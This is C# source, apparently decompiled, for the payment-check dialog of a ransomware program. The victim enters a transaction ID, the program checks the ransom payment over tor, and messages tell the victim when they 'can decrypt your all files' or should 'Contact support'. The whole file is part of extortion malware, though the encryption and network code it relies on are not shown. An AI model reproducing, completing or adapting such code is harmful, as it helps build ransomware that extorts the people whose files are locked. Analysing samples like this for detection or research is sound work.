using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace wg
{
	public class CheckPaymentForm : Form
	{
		private IContainer components;

		private TextBox TransactionIdText;

		private Button CheckPayment;

		private Label TransactionId;

		public CheckPaymentForm()
		{
			this.InitializeComponent();
			this.TransactionIdText.Text = Utils.LastTransaction;
		}

		private void ShowNotification(IWin32Window owner, int result)
		{
			switch (result)
			{
			case -10:
				MessageBox.Show(this, "Can not extract tor bundle", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			case -9:
			case -7:
			case -5:
			case -4:
			case -3:
				break;
			case -8:
				MessageBox.Show(this, "Unknown error", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			case -6:
				MessageBox.Show(this, "Can not start tor. Check internet connection or proxy settings", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			case -2:
				MessageBox.Show(this, "Your key is wrong. Contact support", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				break;
			case -1:
				MessageBox.Show(this, "Transaction not accepted yet. Try again later", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			case 0:
				MessageBox.Show(this, "Transaction accepted. Now you can decrypt your all files", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				return;
			default:
				return;
			}
		}

		private void CheckPayment_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.TransactionIdText.Text))
			{
				MessageBox.Show(this, "Enter transaction ID", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			Utils.LastTransaction = this.TransactionIdText.Text;
			Utils.CheckInternetConnection();
			if (Utils.inetAvail)
			{
				int result = Utils.CheckPayment(this.TransactionIdText.Text, Utils.useProxy);
				this.ShowNotification(this, result);
			}
			else
			{
				MessageBox.Show(this, "Can not connect to remote server. Check your internet connection or try again later", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.TransactionIdText = new TextBox();
			this.CheckPayment = new Button();
			this.TransactionId = new Label();
			base.SuspendLayout();
			this.TransactionIdText.Location = new Point(100, 12);
			this.TransactionIdText.Name = "TransactionIdText";
			this.TransactionIdText.Size = new Size(261, 20);
			this.TransactionIdText.TabIndex = 0;
			this.CheckPayment.Location = new Point(272, 38);
			this.CheckPayment.Name = "CheckPayment";
			this.CheckPayment.Size = new Size(89, 26);
			this.CheckPayment.TabIndex = 1;
			this.CheckPayment.Text = "Check payment";
			this.CheckPayment.UseVisualStyleBackColor = true;
			this.CheckPayment.Click += new EventHandler(this.CheckPayment_Click);
			this.TransactionId.AutoSize = true;
			this.TransactionId.Location = new Point(12, 15);
			this.TransactionId.Name = "TransactionId";
			this.TransactionId.Size = new Size(80, 13);
			this.TransactionId.TabIndex = 2;
			this.TransactionId.Text = "Transaction ID:";
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(383, 80);
			base.Controls.Add(this.TransactionId);
			base.Controls.Add(this.CheckPayment);
			base.Controls.Add(this.TransactionIdText);
			base.FormBorderStyle = FormBorderStyle.FixedDialog;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "CheckPaymentForm";
			base.ShowInTaskbar = false;
			base.StartPosition = FormStartPosition.CenterParent;
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
